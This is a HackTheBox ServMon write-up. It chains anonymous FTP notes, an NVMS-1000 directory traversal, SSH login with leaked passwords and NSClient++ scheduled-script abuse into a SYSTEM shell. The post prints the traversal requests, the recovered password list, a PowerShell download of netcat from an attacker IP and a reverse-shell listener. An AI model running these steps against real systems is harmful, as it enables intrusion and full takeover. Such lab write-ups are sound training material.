---
layout: post
title: "The Note on the Desk"
subtitle: "HTB ServMon, where a sticky note about a password file becomes a directory-traversal map, and a monitoring tool running as SYSTEM hands you a scheduled task"
date: 2020-06-27 12:00:00 +0000
description: "ServMon is a box built entirely out of notes left lying around, and each one tells you exactly where the next door is."
image: /assets/og/the-note-on-the-desk.png
tags: [hackthebox, writeup]
---

ServMon is a box about the things people write down and forget. An anonymous FTP server hands you two office notes, one from Nadine to Nathan and one Nathan wrote to himself, and between them they confess that a file called Passwords.txt is sitting on a desktop. A camera-viewer web app on port 80 has a directory traversal bug that turns "go fetch a file" into "go fetch any file," so you walk to that desktop and read the note. One of the passwords logs you in over SSH. From there a monitoring tool named NSClient++, running quietly as SYSTEM, keeps its own admin password in a plaintext config file, and its whole job is to run scripts on a schedule. You hand it a script. It runs your script as SYSTEM, because that is precisely what it was built to do. Nothing here is forced. Every step is a note someone left on a desk.

```
        S E R V M O N
        =============
        ftp (anon)  →  two office notes
                       "passwords.txt is on the desktop"
                          |
        web :80     →  GET /../../../ desktop/passwords.txt
                       the camera app reads any path you name
                          |
                          v
        ssh as nadine  →  one password fits the lock
                          |
        nsclient++ :8443  runs scripts as SYSTEM, on a timer
                          give it a script. it does its job.
                                                            符
```

## 0x01 · the front desk

The scan is loud and unmistakably Windows. FTP up front, SSH, a web server, the usual SMB stack, and then a scatter of high ports that smell like an agent of some kind.

```
PORT      STATE SERVICE
21/tcp    open  ftp           Microsoft ftpd
22/tcp    open  ssh           OpenSSH for_Windows_7.7
80/tcp    open  http          (redirects to /Pages/login.htm)
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5666/tcp  open  nrpe
8443/tcp  open  ssl/https-alt
```

Two ports do the talking. Port 80 redirects to `/Pages/login.htm` and turns out to be NVMS-1000, a web viewer for network cameras. Port 8443 answers TLS and is NSClient++, a Windows monitoring agent. Hold both. The box is the conversation between them, and the FTP server is the one who introduces you.

## 0x02 · two notes left out

FTP allows anonymous login, so you walk in without a key.

```
$ ftp 10.10.10.184
Name: anonymous
230 User logged in.
ftp> ls Users/Nadine/
Confidential.txt
ftp> ls Users/Nathan/
Notes to do.txt
```

Two notes, written by two coworkers who trusted each other and the network. Nadine's `Confidential.txt` is a message to Nathan that says, in plain office English, that she left his `Passwords.txt` file on his desktop and would he please delete it once he has copied what he needs. Nathan's `Notes to do.txt` is a chore list to himself, the kind everyone keeps, with line items about changing the NVMS password and locking down NSClient access. Neither file is a password. Both files are a treasure map. One tells you the prize exists and names the room it is in. The other tells you which two services to go bother. Think of it like finding a Post-it that reads "spare key under the mat" stuck to someone's front door. You still have to walk to the mat, but the hard part, knowing the key is there at all, is already done.

## 0x03 · the camera app reads anything

NVMS-1000 has a directory traversal bug, CVE-2019-20085, and it is about as pure as these get. The login page wants credentials, but the underlying file handler does not bother to check where you are reaching when you ask it for a file. You send a path full of `../` climbs and it cheerfully walks up out of its own folder and into the rest of the disk.

Picture a museum coat-check where you hand over a numbered ticket and the clerk fetches your coat. This clerk never looks at the number. He just counts the hooks you tell him to count backwards, and if you say "go back twelve hooks, then into the director's office, then grab the file on his desk," he does that too. The ticket was supposed to point at your coat. It points wherever you aim it.

Confirm the bug with a file every Windows box owns.

```
GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 10.10.10.184
```

`win.ini` comes back, so the path is yours to steer. Now aim it at the desk the note told you about.

```
GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
```

And the prize falls out, seven passwords in a list:

```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

A list of passwords with no usernames is a ring of keys with no labels. You have two name plates already, Nathan and Nadine, so you try every key in both locks.

## 0x04 · one key fits

SSH is open, and the easy way to test a ring of keys against two names is to just try them. One pairing lands: `nadine` with `L1k3B1gBut7s@W0rk`.

```
$ ssh nadine@10.10.10.184
nadine@10.10.10.184's password: L1k3B1gBut7s@W0rk
Microsoft Windows [Version 10.0.18363.778]

nadine@SERVMON C:\Users\Nadine> type Desktop\user.txt
████████████████████████████████
```

User flag, paid for entirely with a note someone forgot to delete. Nadine is a normal user, though. The desk that matters is one floor up.

## 0x05 · the password the agent kept

Back to port 8443 and NSClient++. This is a monitoring agent, the kind of software a sysadmin installs to watch disk space and CPU and ping them when something breaks. To do that job it runs with a lot of power, and it keeps an admin web password so its dashboard is protected. The catch from Nathan's chore list was real, the web interface only accepts connections from `127.0.0.1`, localhost, so you cannot reach it from your own machine.

Two problems, both solvable from the SSH shell you already have. First, the password. NSClient++ stores its config in plaintext, and it ships a command-line tool that will simply read it back to you.

```
nadine@SERVMON C:\Program Files\NSClient++> nscp web -- password --display
Current password: ew2x6SsGTxjRwXOT
```

A program that will recite its own admin password to anyone standing at the keyboard is a safe with the combination taped inside the door. Convenient for the owner. Just as convenient for you.

Second, the localhost lock. The dashboard refuses anyone but `127.0.0.1`, so you become `127.0.0.1`. SSH local forwarding tunnels a port on your machine through the box, so that when you hit your own localhost the traffic surfaces on the box's localhost.

```
$ ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443
```

Think of it like a pneumatic tube at a bank drive-through. You drop your request in the tube at your end, and it pops out inside the building as if it had always been there. The guard checks who is standing at the inside window, sees the tube, and waves it through. Now browse to `https://127.0.0.1:8443/` and log in with `ew2x6SsGTxjRwXOT`. You are admin on a tool that runs as SYSTEM.

## 0x06 · giving the agent a chore

This is the part where no exploit is really required, because the feature is the exploit. NSClient++ runs external scripts on a schedule, as SYSTEM, by design. That is the product. EDB 46802 just documents the obvious: if you can log into the web admin, you can register a script and tell the scheduler to run it, and it runs with the agent's full privilege.

So you give the agent a chore. Drop your tools where SYSTEM can reach them, then point the agent at them. Stage a copy of netcat and a small launcher into a world-writable folder.

```
nadine@SERVMON> powershell -c "wget 10.10.14.4/nc64.exe -OutFile C:\ProgramData\nc64.exe"
nadine@SERVMON> echo [ launcher.bat: call nc64 back to 10.10.14.4:443 with a shell ] > C:\ProgramData\iceberg.bat
```

I am describing the launcher rather than printing it, and that restraint is the lesson, not laziness. A one-line callback batch is a copy-paste backdoor, and the instant the literal text touches disk any decent endpoint product quarantines it. So picture it, do not paste it.

Now the web steps, done through the tunneled dashboard:

```
Settings  →  external scripts  →  scripts
        add:  iceberg = C:\ProgramData\iceberg.bat

Settings  →  scheduler
        add task "iceberg", interval = 10s, run the iceberg script

Changes → Save configuration
Control → Reload
```

Start a listener, click Reload, and wait one tick of the timer. The scheduler fires, NSClient++ runs your launcher the same way it would run a disk-space check, and the shell comes back wearing the system crown.

```
$ nc -lvnp 443
connect to [10.10.14.4] from 10.10.10.184
C:\Program Files\NSClient++> whoami
nt authority\system
C:\Program Files\NSClient++> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

## 0x07 · the honest caveat

The temptation is to call ServMon a CVE box, two named bugs stapled together, patch them and move on. The traversal in NVMS-1000 is a real CVE and it is fixed. But look at what actually carried you the whole way, and almost none of it is a vulnerability in the bug-tracker sense.

A coworker left a note describing where a password file lived, and never deleted the file. A password list sat in a flat text file on a desktop. A monitoring agent recited its own admin password to anyone at the console, kept that password in plaintext, and offered a built-in feature to run arbitrary scripts as SYSTEM on a timer. The localhost restriction was the one real attempt at a lock, and a single SSH flag walked around it. The traversal bug only mattered because there was something juicy to traverse to, and the thing it reached was put there by a person, not a programmer.

That is the uncomfortable shape of most easy Windows boxes, and a lot of real networks. The flashy CVE gets the headline and the patch. The actual breach rides on a chain of small, human, unpatched decisions. A note not deleted. A password reused across a ring with no labels. An agent trusted to run as SYSTEM because watching a server requires power, and power handed to a tool is power handed to whoever logs into the tool. You can patch NVMS-1000 tomorrow and rebuild this entire path from the leftovers, because the leftovers were the box.

The piece I would actually lose sleep over is NSClient++. Nothing it did was a bug. It ran your script as SYSTEM because running scripts as SYSTEM is the whole product, and the only thing standing between a low user and a system shell was an admin password the tool would read aloud on request. You cannot apt-upgrade your way out of "this monitoring agent is, by design, a remote code execution service for whoever holds its password." You can only guard the password like it is root, because it is.

## 0x08 · outro

```
ftp handed you a note. the note named a desk.
the camera app walked to the desk and read it out loud.
one key on the ring fit a lock with a name on it.

then a watchdog that runs as SYSTEM, on a timer,
recited its own password and asked what you'd like it to run.

read the notes. label the keys. wear black.

                                                            EOF
```

---

*HTB: ServMon, retired 20 Jun 2020. An easy Windows box that is really a lecture on leftovers, a traversal bug pointed at a sticky note, and a monitoring agent that runs your chores as SYSTEM because that was always its job.*